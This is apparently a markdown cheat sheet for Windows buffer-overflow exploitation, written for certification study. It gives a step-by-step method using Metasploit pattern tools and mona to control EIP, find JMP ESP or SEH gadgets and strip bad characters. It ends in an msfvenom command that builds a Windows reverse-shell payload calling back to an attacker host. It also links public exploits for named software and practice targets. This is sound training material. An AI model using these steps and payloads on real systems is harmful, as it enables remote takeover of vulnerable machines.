# Buffer Overflow Cheat Sheet
## Common Tips
1. Running Vulnerable-apps, then use netcat to makesure the shell connection, and test the function for buffer storing
```
netcat <target_ip> <port>
```

2. Fuzzing ([Fuzzer.py](https://github.com/rdoix/Buffer-Overflow-Cheat-Sheet/blob/master/Fuzzer.py))

3. Add pattern for crash replication and controlling EIP
```
msf-pattern_create -l $length
msf-pattern_offset -q $EIP
```

  4. Compare the bad chars
```
!mona config -set workingfolder c:\mona\%p
!mona bytearray -b "\x00"
!mona compare -f C:\mona\vulnapp\bytearray.txt -a <ESP_badchar_address>
```
After found the bad character we have 2 method, using step 5 or 6

  5. Find address JMP ESP with the true bad chars, *if using this method please SKIP step 6-8, and continue at point 9
  ```
  !mona jmp -r esp -cpb  "\x00\xyz\xxx"
  ```
#
  6. keep the same order of outputs
```
msf-nasm_shell
   nasm > jmp esp
   00000000  FFE4              jmp esp
```

  7. show and select a dll module
```
!mona modules
```  
  8. find address of "jmp esp" (xff xe4)
```
!mona find -s "\xff\xe4" -m "suspectmodule.dll"
```
#
  9. find "pop,pop,ret" for SEH
```
!mona seh -m "$module"
```
  10. generate Windows reverse shell
```
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -b "\x00\xyz\xxx" EXITFUNC=thread -f python -v payload"
```

## Tutorials / Methodologies
* https://github.com/gh0x0st/Buffer_Overflow
* https://infosecsanyam261.gitbook.io/tryharder/buffer-overflow
* https://blog.own.sh/introduction-to-network-protocol-fuzzing-buffer-overflow-exploitation/
* https://veteransec.com/2018/09/10/32-bit-windows-buffer-overflows-made-easy/
* https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/buffer-overflow
* https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/
* https://eazeysec.com/BOF-Method/
* http://www.primalsecurity.net/tutorials/exploit-tutorials/
* http://www.fuzzysecurity.com/tutorials.html
* Jump to shellcode:
  * https://www.abatchy.com/2017/05/jumping-to-shellcode.html
  * https://www.securitysift.com/windows-exploit-development-part-4-locating-shellcode-jumps/

## Tools
* [Immunity Debugger](https://www.immunityinc.com/products/debugger/): A powerful new way to write exploits, analyze malware, and reverse engineer binary files ([whitepaper](https://www.sans.org/reading-room/whitepapers/malicious/basic-reverse-engineering-immunity-debugger-36982), [course](https://yaksas-csc.teachable.com/p/immunity-debugger-for-exploit-devs-ycsc-lab-essentials))

* [OllyDbg](http://www.ollydbg.de/): A 32-bit assembler level analysing debugger for Microsoft Windows ([tut]())

* [Windbg](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-tools): A kernel-mode and user-mode debugger that is included in Debugging Tools for Windows ([tut]())

* [edb](https://github.com/eteran/edb-debugger): A Linux equivalent of the famous Olly debugger on the Windows platform.

* [Boofuzz](https://github.com/jtpereyda/boofuzz): Network Protocol Fuzzing for Humans

* [mona](https://github.com/corelan/mona): A Python script that can be used to automate and speed up specific searches while developing exploits (typically for the Windows platform) ([tut](https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/), [cheatsheet](https://www.corelan.be/index.php/2010/01/26/starting-to-write-immunity-debugger-pycommands-my-cheatsheet/))
```
!mona findmsp
!mona modules [ -o ]: (-o: only in the application which is more reliable)
!mona jmp -r esp [ -o ] 
!mona seh       
!mona seh -m -o
!mona bytearray -cpb "\x00"
!mona compare -f c:\mona\pcmanftpd2\bytearray.bin -a 0012ED6C
!mona find -s "\xff\xe4" -m "libspp.dll"
!mona findmsp
```
* [WinDBG](http://www.windbg.org/): A kernel-mode and user-mode debugger that is included in Debugging Tools for Windows

## Exploitation for Practice
* PWK 2020
  * - [x] SyncBreeze version 10.0.28 ([exploit](https://www.exploit-db.com/exploits/42928), [code](https://github.com/Hamza-Megahed/pentest-with-shellcode/tree/master/10-real-world-scenarios-part2))
  * - [x] PWK Crossfire-server 1.9.0 ([exploit](https://www.exploit-db.com/exploits/1582))
  * - [x] PWK Extra Mile Exercises: VulnApp1.exe, VulnApp2.exe, and VulnApp3.exe
  * - [x] PWK Fixing Exploits Sync Breeze Enterprise 10.0.28
* Vunlserver ([github](https://github.com/stephenbradshaw/vulnserver), [tut](http://www.thegreycorner.com/p/vulnserver.html?m=1), [exploited functions](https://limbenjamin.com/articles/vulnserver-order-of-difficulty.html), [TRUN exploit](https://fullpwnops.com/vulnserver-trun/))
* Easy File Sharing Web Server 7.2 ([exploit](http://strongcourage.github.io/2020/04/19/bof.html), [code](https://github.com/Hamza-Megahed/pentest-with-shellcode/tree/master/11-real-world-scenarios-part3), [tut](https://h0mbre.github.io/Easy_File_Sharing_Web_Server/))
* Seattle Lab Mail (SLmail) 5.5 ([python exploit](https://www.exploit-db.com/exploits/638), [C exploit](https://www.exploit-db.com/exploits/646))
* Freefloat FTP Server 1.0 ([exploit](https://www.exploit-db.com/exploits/17546))
* MiniShare 1.4.1 ([exploit](https://www.exploit-db.com/exploits/636))
* Savant Web Server 3.1 ([exploit](https://www.exploit-db.com/exploits/10434))
* WarFTP 1.65 ([exploit](https://www.exploit-db.com/exploits/3570))
* BigAnt Server 2.52 ([exploit](https://www.exploit-db.com/exploits/10973), [tut](http://www.primalsecurity.net/0x3-exploit-tutorial-buffer-overflow-seh-bypass/))
* ASX to MP3 Converter 1.82.50 ([exploit](https://www.exploit-db.com/exploits/38457), [tut](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/))
* Easy RM to MP3 Converter ([exploit](https://www.exploit-db.com/exploits/9186))
* Zip-n-Go 4.9 ([exploit](https://www.exploit-db.com/exploits/44828), [FileFuzz](http://www.fuzzing.org/wp-content/FileFuzz.zip))
* IDSECCONF 2013 myftpd challenge ([tut-xp](https://buffered.io/posts/idsecconf-2013-myftpd-challenge/), [tut-win7](https://buffered.io/posts/myftpd-exploit-on-windows-7/))
* QuickZip 4.x ([exploit](https://www.exploit-db.com/exploits/11656), [tut1](https://www.offensive-security.com/vulndev/quickzip-stack-bof-0day-a-box-of-chocolates/), [tut2](https://blog.knapsy.com/blog/2017/05/01/quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/))
* Easy Chat Server 3.1 ([tut](https://www.onsecurity.co.uk/blog/buffer-overflow-easy-chat-server-31))
* dostackbufferoverflowgood ([exploit & tut](https://github.com/justinsteven/dostackbufferoverflowgood))
* Vulnhub machines: [Brainpan series](https://www.vulnhub.com/series/brainpan,32/), [SmashTheTux: 1.0.1](https://www.vulnhub.com/entry/smashthetux-101,138/), [Cyberry: 1](https://www.vulnhub.com/entry/cyberry-1,217/), [Pinky’s Palace series](https://www.vulnhub.com/series/pinkys-palace,151/), [Lord Of The Root: 1.0.1](https://www.vulnhub.com/series/lord-of-the-root,67/)

### Structured Exception Handler (SEH)
* Konica Minolta FTP Utility 1.00 ([exploit](https://www.exploit-db.com/exploits/39215), [tut](https://www.youtube.com/watch?v=v0C4M0UpDbc))
* Millenium MP3 Studio 2.0 ([exploit](https://www.exploit-db.com/exploits/10240), [tut](https://fullpwnops.com/local-seh-overflow/))
* IntraSRV 1.0 ([exploit](https://cxsecurity.com/issue/WLB-2019100164), [tut](https://fullpwnops.com/CVE-2019-17181-intrasrv-writeup/))
* File Sharing Wizard 1.5.0 ([exploit](https://www.exploit-db.com/exploits/47412), [tut](https://fullpwnops.com/CVE-2019-16724-Remote-Unauthenticated-SEH-overflow/))

### More Targets
* https://github.com/freddiebarrsmith/Buffer-Overflow-Exploit-Development-Practice
* https://www.vortex.id.au/2017/05/pwkoscp-stack-buffer-overflow-practice/
* https://exploit.education/
* https://overthewire.org/wargames/narnia/
* Useful links: https://github.com/security-prince/PWK-OSCP-Preparation-Roadmap/blob/master/BOF

### Advanced Topics for OSCE
* Windows drivers: https://github.com/hacksysteam/HackSysExtremeVulnerableDriver
* https://github.com/dhn/OSCE
* https://purpl3f0xsec.tech/2019/06/18/osce-prep-1.html
* Windows Exploitation Pathway
* https://github.com/epi052/OSCE-exam-practice

## Books
* Hacking - The Art of Exploitation
* The Shellcoder’s Handbook: Discovering and Exploiting Security Holes
* Buffer Overflow Attacks: Detect, Exploit, Prevent
* Writing Security Tools and Exploits
* Penetration Testing with Shellcode: Detect, exploit, and secure network-level and operating system vulnerabilities
```
# From Kali, run first
~/OSCP/windows_buffer_overflows$ nc -l -p 1234 > VulnApp1.exe
# From Windows
C:\Tools\windows_buffer_overflows> nc -w 3 192.168.119.223 1234 < VulnApp1.exe

# Windows 10: Bridged Adapter network
# Kali: NAT network
```

* Download windows 10 x86 ISO: https://www.microsoft.com/en-gb/software-download/windows10ISO

# 
Reffrence :
* _https://tcm-sec.com/2019/05/25/buffer-overflows-made-easy/_
* _https://www.thecybermentor.com/buffer-overflows-made-easy_
* _http://strongcourage.github.io/2020/04/19/bof.html_
